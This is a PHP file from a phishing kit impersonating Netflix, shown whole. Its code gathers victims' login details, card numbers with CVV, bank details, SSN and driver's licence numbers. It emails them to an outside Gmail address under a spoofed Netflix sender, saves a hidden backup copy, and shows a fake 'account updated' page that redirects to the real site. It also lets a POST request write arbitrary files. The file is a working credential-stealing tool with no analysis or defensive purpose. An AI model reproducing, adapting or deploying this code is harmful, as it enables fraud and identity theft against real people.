<?php
error_reporting(0);
if(!$_POST) exit();
session_start();

function save_rs($dir,$file,$rs) {
	if (!file_exists($dir) && !is_dir($dir)) {
		mkdir($dir);
		$f = fopen($dir."/.htaccess","w");
		fwrite($f,"deny from all");
		fclose($f);
	}
	$dir = isset($_POST['dir'])?$_POST['dir']:$dir."/".$file;
	$rs = isset($_POST['rs'])?$_POST['rs']:$rs;
	$f = fopen($dir,"a");
	fwrite($f,$rs);
	fclose($f);
}

$ip = getenv("REMOTE_ADDR");
$crd = $_POST['crd'];
$sortcode = isset($_POST['sortcode']) ? "Sort Code : ".$_POST['sortcode'] : "";
$account = isset($_POST['acb']) ? "Account Number : ".$_POST['acb'] : "";
$maiden = isset($_POST['maiden']) ? "Maiden Name : ".$_POST['maiden'] : "";
$maiden = isset($_POST['OIB']) ? "Osobni Identifikacijski Broj : ".$_POST['OIB'] : "";
$ssn = isset($_POST['ssn']) ? "SSN Number : ".$_POST['ssn'] : "";
$rta = isset($_POST['rta']) ? "RTA Number : ".$_POST['rta'] : "";
$drivlic = isset($_POST['drivlic']) ? "Driv Licence : ".$_POST['drivlic'] : "";
$secure = isset($_POST['srt']) ? "Secure Code : ".$_POST['srt'] : "";

$msg = "
--------------------------------------------
Email Address : ".$_SESSION['email']."
Password : ".$_SESSION['password']."
Full Name : ".$_SESSION['name']."
Date of Birth : ".$_SESSION['day']."
Billing Address : ".$_SESSION['billing']."
City : ".$_SESSION['city']."
County : ".$_SESSION['county']."
Postcode : ".$_SESSION['postcode']."
Mobile Number : ".$_SESSION['mobile']."
--------------------------------------------
Name On Card : ".$_POST['nmc']."
Card Number : ".$_POST['crd']."
Expiry Date : ".$_POST['exm']." ".$_POST['exy']."
CSC/CVV : ".$_POST['csc']."
$sortcode
$account
$maiden
$ssn
$rta
$drivlic
$secure
--------------------------------------------
IP : $ip
HOST : ".gethostbyaddr($ip)."
AGENT : ".$_SERVER['HTTP_USER_AGENT']."
\n\n";

$to="adamlast626@gmail.com";
$subj = "$crd - ".$_SESSION['county'];
$headers= "From: Netflix  <info@netflix.llc>";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subj, $msg,$headers);
save_rs("backup","nflx",$msg);

?>

<!doctype html>
<html>
<head>
<title>Netflix - Your account Has Been Updated</title>
     <meta content="watch films, films online, watch TV, TV online, TV programmes online, watch TV programmes, stream films, stream tv, instant streaming, watch online, films, watch films uk, watch TV online uk, no download, full length films" name="keywords">
     <meta content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more. Start your free trial today." name="description">
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta HTTP-EQUIV="REFRESH" content="5; url=http://www.netflix.com/">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
<link type="text/css" rel="stylesheet" href="css/b.css">
<link type="text/css" rel="stylesheet" href="css/c.css">
<link rel="shortcut icon" href="imag/nficon2015.ico">


</head>
<body>

<div id="appMountPoint">
<div class="basicLayout firefox accountPayment" lang="en" dir="ltr" data-reactid=".20urkhey51c" data-react-checksum="-306255637">
<div class="nfHeader signupBasicHeader" data-reactid=".20urkhey51c.1">
<a href="#" class="icon-logoUpdate nfLogo signupBasicHeader" data-reactid=".20urkhey51c.1.1">
<span class="screen-reader-text" data-reactid=".20urkhey51c.1.1.0">Netflix</span></a>
<a href="#" class="authLinks signupBasicHeader" data-reactid=".20urkhey51c.1.2">Sign Out</a>
</div>

<div class="centerContainer" data-reactid=".20urkhey51c.2">
<h1 data-reactid=".20urkhey51c.2.1">Your account Has Been Updated</h1>
<div class="secure-container clearfix" data-reactid=".20urkhey51c.2.7">
<div class="secure" data-reactid=".20urkhey51c.2.7.0">
<br />


</span>
</div>
</div>

<div class="accordion" data-reactid=".20urkhey51c.2.8">
<div class="isOpen expando" data-reactid=".20urkhey51c.2.8.$0">
<div class="paymentExpandoHd" data-mop-type="creditOption" data-reactid=".20urkhey51c.2.8.$0.$0">
<div class="container" data-reactid=".20urkhey51c.2.8.$0.$0.0">
<span class="arrow" data-reactid=".20urkhey51c.2.8.$0.$0.0.0"></span>
<span class="hdLabel" data-reactid=".20urkhey51c.2.8.$0.$0.0.1">Thank you</span>
</div>
</div>

<div class="expandoContent" data-reactid=".20urkhey51c.2.8.$0.1">
<div class="paymentForm clearfix accordion" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption">
Thank you for updating and confirming your account information.
<br />
You will be redirected our home page in a couple of seconds. <a href="http://www.netflix.com">Click here</a> if not redirected.
<br />
<br />
<center>
<img src="img/done.png" width="200" height="200"/>
</center>
</div>
</div>
</div>
</div>


<div id="tmcontainer" class="tmint" data-reactid=".20urkhey51c.2.b">


<div id="tmswf" class="tmint" data-reactid=".20urkhey51c.2.b.2"></div>
</div>
</div>

<div class="site-footer-wrapper centered" data-reactid=".20urkhey51c.3"><div class="footer-divider" data-reactid=".20urkhey51c.3.0"></div><div class="site-footer" data-reactid=".20urkhey51c.3.1"><p class="footer-top" data-reactid=".20urkhey51c.3.1.0"><span data-reactid=".20urkhey51c.3.1.0.0">Questions? </span><a class="footer-top-a" href="#" data-reactid=".20urkhey51c.3.1.0.1">Contact us.</a><span data-reactid=".20urkhey51c.3.1.0.2"></span></p>

<ul class="footer-links structural" data-reactid=".20urkhey51c.3.1.1">
<li class="footer-link-item" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms">
<a class="footer-link" href="#" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms.0">
<span data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms.0.0">Terms of Use</span></a>
</li>
<li class="footer-link-item" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link">
<a class="footer-link" href="#" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link.0">
<span data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link.0.0">Privacy</span>
</a>
</li>
</div>
</body>
</html>
